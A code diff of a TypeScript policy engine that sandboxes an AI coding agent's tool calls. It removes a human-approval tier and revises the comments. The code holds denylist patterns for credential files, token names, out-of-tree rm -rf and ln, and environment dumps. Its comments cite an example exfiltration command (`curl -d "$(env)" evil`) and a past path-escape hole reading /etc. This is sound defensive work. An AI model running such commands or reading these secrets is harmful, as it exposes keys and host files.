@@ -3,26 +3,18 @@ import { resolve, sep } from "node:path";
 import type { ToolCall } from "./types";
 
 // The policy engine. Pure function: a tool call plus its worktree context maps
-// to allow or deny. It holds NO state.
-//
-// This used to have three tiers, the middle one being "gate" — pause the call and
-// wait for an architect to click Approve in Slack. That tier is gone (2026-07-26).
-// Condotto runs on a dedicated box for one trusted team, and only architects can
-// drive a session at all, so a per-call approval was asking a trusted person to
-// confirm work they had just asked for. What is left is the floor: the boundary
-// that holds no matter who is asking, because the thing it defends against is not
-// a person in Slack but a string in a dependency README.
+// to allow or deny. It holds NO state, and it never asks a human anything.
 //
 //   allow — anything inside the boundary.
 //   deny  — the floor: out-of-worktree access, credential exfiltration,
 //           recursive-force deletes escaping the tree, and (in plan mode)
 //           anything that is not a genuine read.
 //
-// Bash confinement here is heuristic and deliberately not exhaustive. It cannot
-// be otherwise: a command is a string, and no lexical check can promise where it
-// will reach. That is exactly why bash-shaped danger is a FLOOR of high-signal
-// patterns rather than a claim of containment, and why the worktree boundary
-// (which is lexical and provable) is enforced on path-bearing tools instead.
+// Bash confinement here is heuristic and cannot be otherwise: a command is a
+// string, and no lexical check can promise where it will reach. So bash-shaped
+// danger is a FLOOR of high-signal patterns rather than a claim of containment,
+// and the worktree boundary — lexical and provable — is enforced on path-bearing
+// tools instead.
 
 export type PolicyAction = "allow" | "deny";
 
@@ -60,8 +52,8 @@ export interface PolicyContext {
    * else is denied with a message telling the agent what to do instead.
    *
    * The one exception is the plan-file write itself — that write IS how a plan is
-   * presented, since the runtime exposes no plan-exit tool headless (spike
-   * 2026-07-25). It allows, carries `plan: true`, and the session manager posts
+   * presented, since the runtime exposes no plan-exit tool headless. It allows,
+   * carries `plan: true`, and the session manager posts
    * its content into the thread.
    *
    * Session-scoped rather than tool-scoped, and it lives here rather than in the
@@ -76,7 +68,7 @@ export interface PolicyContext {
    * other path, and outside plan mode it is an ordinary directory.
    *
    * Its only job is to name the one write plan mode permits. The headless plan
-   * protocol has no plan-exit tool (spike 2026-07-25): the model presents a plan
+   * protocol has no plan-exit tool: the model presents a plan
    * by WRITING it here, and that write carries the whole plan as `content`.
    */
   plansDir?: string;
@@ -171,42 +163,10 @@ function pathTargets(input: unknown, from: string): { value: string; target: str
 }
 
 /**
- * The first path field (if any) that targets the session's MEMORY root — the one
- * place outside the worktree the agent may touch.
- *
- * This is deliberately NOT expressed by making `offendingPath` take a set of roots.
- * Memory is not "another worktree": it is readable but writable only as `.md`
- * through `Write`/`Edit`, never reachable from a subagent or from Bash, and it
- * OUTLIVES the worktree. Folding it into the containment root set would grant all
- * of those by default and leave the differences to be re-subtracted downstream —
- * the shape most likely to leak one by omission. Keeping it a separate, named
- * question means each rule has to be stated on purpose.
- *
- * `base` — the session cwd — is REQUIRED and has no default, unlike
- * `offendingPath`'s. Defaulting it to the memory root would resolve every RELATIVE
- * path there, so an ordinary `Read src/index.ts` would look like a memory access
- * and (in `evaluateConfined`) be denied to every subagent. Memory is only ever
- * addressable by absolute path; a relative one resolves inside the worktree and
- * must never reach here.
- *
- * The root passed in has already been realpath-proven and symlink-swept by
- * `MemoryManager.prepare`, which is what keeps this test lexical — and this whole
- * module pure and synchronous.
- */
-export function memoryPath(memoryRoot: string, input: unknown, base: string): string | null {
-  const root = resolve(memoryRoot);
-  const from = resolve(base);
-  for (const { value, target } of pathTargets(input, from)) {
-    if (containedIn(target, root)) return value;
-  }
-  return null;
-}
-
-/**
  * Every ABSOLUTE target of this input that lands under the memory root, legal shape
- * or not. The session-manager gate re-proves each against the filesystem before
- * allowing the call — see `verifyMemoryTarget`. Returns absolute paths (unlike
- * `memoryPath`, which returns the raw input value for error messages).
+ * or not. The session manager re-proves each against the filesystem before the
+ * call runs — see `verifyMemoryTarget`. Returns absolute paths (unlike
+ * `evaluateBase`'s own scan, which keeps the raw input value for error messages).
  */
 export function memoryTargets(memoryRoot: string, input: unknown, base: string): string[] {
   const root = resolve(memoryRoot);
@@ -255,20 +215,12 @@ function globPatternEscapes(pattern: unknown): boolean {
 }
 
 /**
- * Classify a tool call. Dispatches on the call's ORIGIN first: a
- * subagent/workflow-agent call OR an "escaped" un-deferrable call
- * is CONFINED — it can't be paused for approval, so gated actions are
- * denied (read-only), unless the worktree-write opt-in allows confined writes.
- * The main agent may spawn subagents/workflows when enabled; everything else runs
- * the base tool-semantics rules.
+ * Classify a tool call. ORIGIN-BLIND: a subagent, a workflow agent and a call
+ * arriving on the harness backstop all get the identical answer, because a
+ * subagent acting inside an architect's turn IS the architect's turn.
+ * `call.agentId` and `call.escaped` are audit detail, never policy inputs.
  */
 export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
-  // Origin no longer changes the answer. It used to: a subagent or workflow
-  // agent's call could not be paused for approval, so anything gate-tier had to
-  // become a deny for them, which is why the fan-out was read-only. With no gate
-  // tier there is nothing to pause, and a subagent acting inside an architect's
-  // turn is the architect's turn. `call.agentId` and `call.escaped` survive as
-  // audit detail; they are not policy inputs.
   if (ctx.planMode) return evaluatePlanning(call, ctx);
   return evaluateBase(call, ctx);
 }
@@ -296,23 +248,6 @@ function evaluatePlanning(call: ToolCall, ctx: PolicyContext): PolicyDecision {
 }
 
 /**
- * Does this call reach for the session's memory in ANY way? Covers the ordinary
- * path fields AND Glob's `pattern`, which is a path glob in its own right and is
- * NOT one of `PATH_FIELDS` — checking only the path fields would leave
- * `Glob{pattern: "<memory>/*.md"}` readable from a subagent, the one fan-out leg
- * that needs no approval. Bash is excluded on purpose: it names no path field, and
- * is floored against memory in `bashHardDeny` instead.
- */
-function touchesMemory(call: ToolCall, ctx: PolicyContext): boolean {
-  if (!ctx.memoryRoot) return false;
-  const from = ctx.cwd ?? ctx.worktree;
-  if (memoryPath(ctx.memoryRoot, call.input, from) !== null) return true;
-  if (call.name !== "Glob") return false;
-  const pattern = (call.input as Record<string, unknown> | null)?.pattern;
-  return memoryPath(ctx.memoryRoot, { path: pattern }, from) !== null;
-}
-
-/**
  * A denial reason tailored to a path that lands under the memory root but is not a
  * legal memory file — "outside your worktree" would be true but useless there, and
  * an agent that cannot tell "forbidden" from "wrong shape" just retries.
@@ -334,21 +269,16 @@ function evaluateBase(call: ToolCall, ctx: PolicyContext): PolicyDecision {
   // Side-effect-free meta tools: always fine, touch no filesystem.
   if (NO_FS_TOOLS.has(name)) return allow(name === "ToolSearch" ? "loads a tool definition" : "updates its task plan");
 
-  const offender = offendingPath(ctx.worktree, call.input, ctx.cwd);
-  // Memory vs. escape, decided over the WHOLE set of path targets rather than by
-  // comparing two independent first-matches.
+  // Memory vs. escape, decided over the WHOLE set of path targets. Comparing two
+  // independent first-matches was a critical hole (review 2026-07-20): a memory
+  // target is out-of-worktree BY DEFINITION, so a memory-valued `file_path` was
+  // both the first offender and the first memory hit, they compared equal, and a
+  // second field escaping anywhere on the host was silently discarded —
+  // `Grep{file_path:"<mem>/MEMORY.md", path:"/etc"}` came back ALLOW.
   //
-  // The first-match form was a critical hole (review 2026-07-20): a memory target
-  // is out-of-worktree BY DEFINITION, so a memory-valued `file_path` was both the
-  // first offender and the first memory hit, they compared equal, and a second
-  // field escaping to anywhere on the host was silently discarded —
-  // `Grep{file_path:"<mem>/MEMORY.md", path:"/etc"}` came back ALLOW. Grep ignores
-  // `file_path`, so the decoy cost nothing and the read was auto-allowed with no
-  // approval record, on a member's turn.
-  //
-  // The rule now: ANY out-of-worktree target that is not a valid memory file is an
-  // escape, and the memory branch is taken only when EVERY out-of-worktree target
-  // is one. One list, both questions.
+  // The rule: ANY out-of-worktree target that is not a valid memory file is an
+  // escape, and the memory branch is taken only when EVERY one of them is a memory
+  // file. One list, both questions.
   const from = resolve(ctx.cwd ?? ctx.worktree);
   const outside = pathTargets(call.input, from).filter(
     (t) => !containedIn(t.target, resolve(ctx.worktree)),
@@ -410,11 +340,10 @@ function evaluateBase(call: ToolCall, ctx: PolicyContext): PolicyDecision {
       }
       return allow(describeCall(call));
     }
-    if (escapedPath ?? offender) {
-      const bad = (escapedPath ?? offender)!;
+    if (escapedPath) {
       return deny(
-        outsideReason(bad, ctx, from) ??
-          `"${bad}" is outside your worktree. Writes are confined to your own working tree.`,
+        outsideReason(escapedPath, ctx, from) ??
+          `"${escapedPath}" is outside your worktree. Writes are confined to your own working tree.`,
       );
     }
     return allow(describeCall(call));
@@ -424,8 +353,8 @@ function evaluateBase(call: ToolCall, ctx: PolicyContext): PolicyDecision {
 
   // Everything else — network tools, the multi-agent spawns, anything the
   // runtime grows next. The floor is the boundary; an unrecognized NAME is not a
-  // danger signal, and treating it as one only produced unreadable approval cards
-  // for tools nobody had classified yet.
+  // danger signal, and refusing an unclassified NAME only broke tools that were
+  // perfectly fine.
   return allow(describeCall(call));
 }
 
@@ -445,9 +374,8 @@ function evaluateBash(input: unknown, ctx: PolicyContext): PolicyDecision {
 /**
  * THE FLOOR for shell. A small, deliberately conservative denylist of things
  * nobody may run, whoever is asking. NOT exhaustive, and it cannot be: a command
- * is a string. Since 2026-07-26 there is no human gate behind it, so it is the
- * last thing standing, and it is sized accordingly: high-signal, unambiguous
- * shapes only. Fuller shell parsing is future work.
+ * is a string. Nothing stands behind it, so it is sized accordingly: high-signal,
+ * unambiguous shapes only. Fuller shell parsing is future work.
  */
 export function bashHardDeny(
   command: string,
@@ -457,24 +385,21 @@ export function bashHardDeny(
   const worktree = ctx?.worktree;
   const base = ctx?.cwd ?? ctx?.worktree;
   // Keep the shell out of the memory directory, so memory changes only through the
-  // path-checked write tools and every change is gated and audited. This fires in
-  // practice: the spike caught the agent reaching for `cat <memory>/MEMORY.md`
-  // unprompted, so the reason TELLS it what to use instead — the floor admits no
-  // override, and an agent that cannot tell "forbidden" from "wrong tool" retries.
+  // path-checked write tools. The agent does reach for `cat <memory>/MEMORY.md`
+  // unprompted, so the reason TELLS it what to use instead.
   //
-  // BEST-EFFORT, NOT A BOUNDARY. It is a literal substring match, so `~/…`,
-  // relative, and `$HOME` spellings of the same path slip past it, and a session
-  // whose own repo has memory OFF has no memoryRoot here at all. Nothing rests on
-  // it: `verifyMemoryTarget` re-proves every memory target in the session-manager
-  // gate, so a link planted by any of those routes is caught at the moment of use.
-  // Do not add security weight to this check — harden the per-call proof instead.
+  // BEST-EFFORT, NOT A BOUNDARY. A literal substring match, so `~/…`, relative and
+  // `$HOME` spellings slip past it, and a session whose repo has memory OFF has no
+  // memoryRoot here at all. Nothing rests on it: `verifyMemoryTarget` re-proves
+  // every memory target per call, which catches a link planted by any of those
+  // routes. Do not add security weight here — harden the per-call proof instead.
   if (memoryRoot && command.includes(memoryRoot)) {
     return "the memory directory isn't reachable from the shell — use the Read, Write, and Edit tools for memory files.";
   }
   // Recursive force-delete whose target escapes the worktree (absolute, home,
-  // parent, variable-expanded, or wildcard). A relative `rm -rf build` is left
-  // to the gate; an `rm -rf /` or `rm -rf ~` is refused outright. Quotes are
-  // stripped first so `rm -rf "/"` / `rm -rf "$HOME"` can't hide the target.
+  // parent, variable-expanded, or wildcard). A relative `rm -rf build` is ordinary
+  // work; an `rm -rf /` or `rm -rf ~` is refused outright. Quotes are stripped
+  // first so `rm -rf "/"` / `rm -rf "$HOME"` can't hide the target.
   for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
     const seg = rawSeg.replace(/['"]/g, "");
     if (!/\brm\b/.test(seg)) continue;
@@ -492,15 +417,13 @@ export function bashHardDeny(
   // Linking something from outside the tree INTO it. Our containment is purely
   // lexical (`offendingPath` never calls realpath — see its docstring), so a link
   // whose target escapes turns every later in-tree path into a real escape: once
-  // `<wt>/x -> /`, an auto-allowed `Read <wt>/x/etc/passwd` is lexically confined
-  // and posts a host file into the thread. This file's own
-  // 2026-07-19 entry both named "don't let `ln -s` auto-approve" as the interim
-  // mitigation that keeps lexical containment tolerable; it was never implemented,
-  // so `ln -s / <wt>/esc` auto-approved on any architect-initiated turn.
+  // `<wt>/x -> /`, an allowed `Read <wt>/x/etc/passwd` is lexically confined and
+  // posts a host file into the thread. This deny is what keeps lexical containment
+  // tolerable.
   //
   // Hard links (`ln` with no `-s`) escape the same way for files, so this is not
-  // scoped to `-s`. A link whose targets are all in-tree relative paths is fine and
-  // still goes to the gate. Quotes are stripped so `ln -s "/"` cannot hide.
+  // scoped to `-s`. A link whose targets are all in-tree paths is ordinary work.
+  // Quotes are stripped so `ln -s "/"` cannot hide.
   for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
     const seg = rawSeg.replace(/['"]/g, "");
     const tokens = seg.trim().split(/\s+/).filter(Boolean);
@@ -530,8 +453,17 @@ export function bashHardDeny(
   }
   // Credential / secret material — incl. /proc/<pid>/environ, which reads a
   // process's whole environment as a file (an env dump by another name).
+  //
+  // The credential DIRECTORIES match with or without a trailing slash. Requiring
+  // the slash was a real hole: `cat ~/.ssh/id_rsa` denied but `cp -r ~/.ssh mine`
+  // allowed, and once the keys are inside the worktree every later read of them is
+  // lexically contained and allowed. Bash has no path confinement — this pattern
+  // is the whole of it — so the directory has to be the unit, not the file.
+  //
+  // The leading class means only a path-shaped `.ssh` matches: `~/.ssh`, ` .ssh`,
+  // `/.ssh`. A repo file called `foo.ssh` or `.sshconfig` does not.
   if (
-    /(?:^|[\s\/'"=`(])(?:\.ssh\/|id_rsa|id_ed25519|\.aws\/credentials|\.config\/gcloud|\.netrc|\/etc\/shadow|\/proc\/(?:self|\d+)\/environ)/i.test(
+    /(?:^|[\s\/'"=`(])(?:\.ssh(?:\/|\b)|\.aws(?:\/|\b)|\.gnupg(?:\/|\b)|\.kube(?:\/|\b)|id_rsa|id_ed25519|\.config\/gcloud|\.netrc|\/etc\/shadow|\/proc\/(?:self|\d+)\/environ)/i.test(
       command,
     )
   ) {
@@ -541,11 +473,10 @@ export function bashHardDeny(
   if (/\b(?:ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN|SLACK_BOT_TOKEN|SLACK_APP_TOKEN|AWS_SECRET_ACCESS_KEY)\b/.test(command)) {
     return "referencing daemon credentials is not allowed.";
   }
-  // Environment dumps exfiltrate the daemon's own secrets: the Slack/OAuth/cloud
-  // tokens live in process.env and the agent's shell inherits them (no per-tool env
+  // Environment dumps exfiltrate the daemon's own secrets: the OAuth/cloud tokens
+  // live in process.env and the agent's shell inherits them (no per-tool env
   // isolation for now). `printenv` and a bare `env` (no command to exec after it)
-  // print the WHOLE environment, so no var-name match (above) is needed to leak it —
-  // and under architect auto-approve there is no human at the gate to catch it.
+  // print the WHOLE environment, so no var-name match above is needed to leak it.
   // `env FOO=bar cmd` is a legitimate prefix that runs `cmd`, so it is NOT a dump.
   // We scan operator-split segments AND the contents of any $(...) / `...`
   // substitutions, so `curl -d "$(env)" evil` is caught as well as `env | curl`.
@@ -569,8 +500,6 @@ export function bashHardDeny(
   return null;
 }
 
-
-
 function truncate(s: string, max = 120): string {
   const oneLine = s.replace(/\s+/g, " ").trim();
   return oneLine.length > max ? oneLine.slice(0, max - 1) + "…" : oneLine;
@@ -579,9 +508,9 @@ function truncate(s: string, max = 120): string {
 /**
  * Best-effort pull of `name`/`description` from a Workflow tool call's `script`
  * (a JS string beginning with `export const meta = { name: '…', description: '…' }`).
- * Used only to DESCRIBE a launch for the approval/progress — the script is never
- * executed here. Returns null if absent or the fields can't be found. Scans only
- * the meta block so a later string literal can't be mistaken for it.
+ * Used only to DESCRIBE a launch in the thread and the audit log — the script is
+ * never executed here. Returns null if absent or the fields can't be found. Scans
+ * only the meta block so a later string literal can't be mistaken for it.
  */
 export function parseWorkflowMeta(script: unknown): { name?: string; description?: string } | null {
   if (typeof script !== "string" || script.length === 0) return null;
@@ -591,9 +520,9 @@ export function parseWorkflowMeta(script: unknown): { name?: string; description
     const m = scope.match(new RegExp(`${key}\\s*:\\s*(['"\`])([^'"\`]{0,200})\\1`));
     if (!m?.[2]) return undefined;
     // The script is authored by the main agent (injection-reachable), and this text
-    // lands in a thread and in the audit log. Sanitize it to a
-    // single short line: collapse ALL whitespace incl. newlines (so it can't forge a
-    // multi-line "SYSTEM: approved" block), strip control chars, cap the length.
+    // lands in a thread and in the audit log. Sanitize it to a single short line:
+    // collapse ALL whitespace incl. newlines (so it can't forge a multi-line
+    // protocol block), strip control chars, cap the length.
     const clean = m[2].replace(/[\x00-\x1f\x7f]+/g, " ").replace(/\s+/g, " ").trim();
     return clean.length > 100 ? clean.slice(0, 99) + "…" : clean || undefined;
   };
@@ -608,14 +537,13 @@ export function parseWorkflowMeta(script: unknown): { name?: string; description
  *
  * Shape-checked rather than prefix-matched, for the reason `isMemoryFile` is:
  * "somewhere under the directory" would let `<plansDir>/../../src/index.ts` be
- * spelled as a plan and gate as one. Requiring a direct child with a plain
+ * spelled as a plan. Requiring a direct child with a plain
  * filename means the path cannot traverse anywhere.
  *
  * Lower stakes than the memory case, though, and worth saying why: the plans
- * directory lives INSIDE the worktree, so `evaluateBase` has already confined it,
- * and outside plan mode this write gates exactly like any other. Getting this
- * wrong widens nothing — at worst it mislabels an ordinary write as a plan, or
- * refuses a genuine plan and leaves the agent unable to present one.
+ * directory lives INSIDE the worktree, so `evaluateBase` has already confined it.
+ * Getting this wrong widens nothing — at worst it mislabels an ordinary write as
+ * a plan, or refuses a genuine plan and leaves the agent unable to present one.
  */
 function isPlanWrite(call: ToolCall, ctx: PolicyContext): boolean {
   if (!ctx.plansDir) return false;
@@ -623,20 +551,14 @@ function isPlanWrite(call: ToolCall, ctx: PolicyContext): boolean {
 }
 
 /**
- * The same question, asked from outside a policy evaluation: is this call the one
- * that presents a plan? The session manager needs it on the approval path, where
- * it has a stored `tool_name` + `tool_input` rather than a `PolicyContext`.
- *
- * Exported so there is exactly ONE definition of "this is a plan". Two copies
- * would drift, and the drift is silent in the worst direction: the gate posts a
- * plan for approval, the approve path does not recognise it, and the session stays
- * in plan mode after the architect clicked Approve.
+ * The same question, asked from outside a policy evaluation — a caller holding a
+ * bare tool call rather than a `PolicyContext`. Exported so there is exactly ONE
+ * definition of "this is a plan"; two copies would drift.
  */
 export function isPlanPresentation(call: ToolCall, plansDir: string, base?: string): boolean {
   if (!WRITE_TOOLS.has(call.name)) return false;
-  // Write/Edit only. MultiEdit and NotebookEdit are excluded for the reason the
-  // memory rules exclude them: the approval renders a readable diff for Edit and
-  // not for those, and a plan is a document a human has to be able to read.
+  // Write/Edit only, for the reason the memory rules exclude the other two: a plan
+  // is a document a human reads, and those make a change that is harder to read back.
   if (call.name === "MultiEdit" || call.name === "NotebookEdit") return false;
   const root = resolve(plansDir);
   const targets = pathTargets(call.input, resolve(base ?? plansDir));
@@ -657,22 +579,17 @@ const MAX_PLAN_CHARS = 20_000;
 
 /**
  * Best-effort pull of the plan text out of the call that presents a plan, so the
- * core can post it into the thread as the thing an architect approves.
+ * core can post it into the thread.
  *
- * `content` first: the headless plan protocol presents a plan by WRITING it, so
- * in practice this is a `Write` and the plan is its content (spike 2026-07-25).
- * `plan` next, for a future SDK that restores a plan-exit tool — its
- * `ExitPlanModeInput` is `{ allowedPrompts?: deprecated } & [k: string]: unknown`
- * and does not name the field, so the longest top-level string is the last
- * resort. A null must degrade to a readable approval, never to a crash or a blank
- * message the architect approves sight-unseen.
+ * `content` first: the headless plan protocol presents a plan by WRITING it, so in
+ * practice this is a `Write` and the plan is its content. `plan`
+ * next, for a future SDK that restores a plan-exit tool — its `ExitPlanModeInput`
+ * does not name the field, so the longest top-level string is the last resort. A
+ * null must degrade to a readable message, never to a crash.
  *
- * Unlike `parseWorkflowMeta`, whitespace is NOT collapsed: this text is a document
- * a human reads, and its line structure is the readability. It rides the ordinary
- * reply path (`surface.post` → the adapter's renderer, which escapes before it
- * linkifies), so it is exactly as safe as any other agent reply — model output has
- * always been allowed to mint a mention token, and the renderer caps that. Control
- * characters are stripped because they are never intentional in a plan.
+ * Unlike `parseWorkflowMeta`, whitespace is NOT collapsed: this is a document a
+ * human reads and its line structure is the readability. It rides the ordinary
+ * reply path, so it is exactly as safe as any other agent reply.
  */
 export function planTextFrom(input: unknown): string | null {
   const i = (input ?? {}) as Record<string, unknown>;
